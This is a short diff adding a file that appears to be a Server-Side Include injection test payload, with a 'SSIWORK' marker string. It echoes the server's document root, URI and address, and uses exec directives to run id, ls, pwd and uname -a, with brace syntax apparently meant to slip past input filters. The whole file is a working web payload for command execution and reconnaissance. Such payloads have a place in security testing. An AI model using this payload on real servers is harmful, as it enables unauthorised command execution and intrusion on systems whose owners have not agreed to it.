@@ -1,0 +1,12 @@
+
+
+<!--#echo var="DOCUMENT_ROOT" -->
+<br>
+<!--#echo var="DOCUMENT_URI" -->SSIWORK
+<br>
+<!--#echo var="SERVER_ADDR" -->
+<br>
+<!--#exec cmd="{id}" -->
+<!--#exec cmd="{ls}" -->
+<br>
+<!--#exec cmd="dir;pwd;{uname,-a}" -->
